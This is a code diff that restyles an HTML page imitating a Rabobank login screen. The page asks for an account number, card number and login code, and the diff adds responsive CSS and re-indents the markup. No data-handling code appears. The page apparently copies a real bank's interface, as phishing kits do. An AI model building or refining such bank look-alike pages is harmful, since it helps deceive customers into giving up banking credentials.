@@ -4,59 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Rabobank</title>
-<style>
-@media (max-width: 768px) {
-    header {
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-    }
-
-    .fields {
-        flex-direction: column;
-        gap: 10px;
-    }
-
-    .field-container {
-        width: 100%;
-        align-items: center;
-    }
-
-    .field {
-        width: 90%;
-    }
-
-    .field-with-checkbox {
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .checkbox-container {
-        justify-content: center;
-    }
-
-    .image-container img {
-        width: 180px; /* Reduce image size */
-        height: 180px;
-    }
-
-    .login-section {
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .footer-buttons {
-        flex-direction: column;
-        gap: 15px;
-    }
-
-    .footer-button {
-        width: 90%;
-        justify-content: center;
-        text-align: center;
-    }
-}
-</style>
     <style>
         body {
             margin: 0;
@@ -96,7 +43,7 @@
         .field-container {
             display: flex;
             flex-direction: column;
-            align-items: flex-start;
+            align-items: center; /* Center the fields */
         }
 
         .field-label {
@@ -111,6 +58,7 @@
             border-radius: 4px;
             padding-left: 10px;
             font-size: 16px;
+            text-align: center;
         }
 
         .field-with-checkbox {
@@ -195,6 +143,63 @@
             cursor: pointer;
         }
 
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .fields {
+                flex-direction: column;
+                gap: 10px;
+                align-items: center; /* Center the fields */
+            }
+
+            .field-container {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center; /* Center content inside the container */
+            }
+
+            .field {
+                width: 90%;
+                text-align: center;
+            }
+
+            .field-with-checkbox {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .checkbox-container {
+                justify-content: center;
+            }
+
+            .image-container img {
+                width: 180px;
+                height: 180px;
+            }
+
+            .login-section {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .footer-buttons {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .footer-button {
+                width: 90%;
+                justify-content: center;
+                text-align: center;
+            }
+        }
     </style>
 </head>
 <body>
@@ -203,35 +208,36 @@
         <div class="header-text">Login</div>
         <div class="language">NL | EN</div>
     </header>
-<center>
-    <div class="fields">
-        <div class="field-container">
-            <div class="field-label">Account Number</div>
-            <input type="text" class="field" id="accountNumber" value="NL•• RABO 0" maxlength="18">
-        </div>
-        <div class="field-with-checkbox">
+    <center>
+        <div class="fields">
             <div class="field-container">
-                <div class="field-label">Card Number</div>
-                <input type="text" class="field" id="cardNumber" maxlength="4">
+                <div class="field-label">Account Number</div>
+                <input type="text" class="field" id="accountNumber" value="NL•• RABO 0" maxlength="18">
             </div>
-            <div class="checkbox-container">
-                <input type="checkbox" id="rememberMe">
-                <label for="rememberMe">Remember</label>
+            <div class="field-with-checkbox">
+                <div class="field-container">
+                    <div class="field-label">Card Number</div>
+                    <input type="text" class="field" id="cardNumber" maxlength="4">
+                </div>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="rememberMe">
+                    <label for="rememberMe">Remember</label>
+                </div>
             </div>
         </div>
-    </div>
 
-    <div class="image-container">
-        <img src="r.png" alt="QR Code">
-    </div>
+        <div class="image-container">
+            <img src="r.png" alt="QR Code">
+        </div>
 
-    <div class="login-section">
-        <input type="text" class="field" id="loginCode" maxlength="8">
-        <button class="login-btn" id="loginBtn">Login</button>
-    </div>
+        <div class="login-section">
+            <input type="text" class="field" id="loginCode" maxlength="8">
+            <button class="login-btn" id="loginBtn">Login</button>
+        </div>
 
-    <div class="login-msg">Please enter your account number and card number.</div>
-</center>
+        <div class="login-msg">Please enter your account number and card number.</div>
+    </center>
+
     <div class="footer">
         <div class="footer-buttons">
             <div class="footer-button">
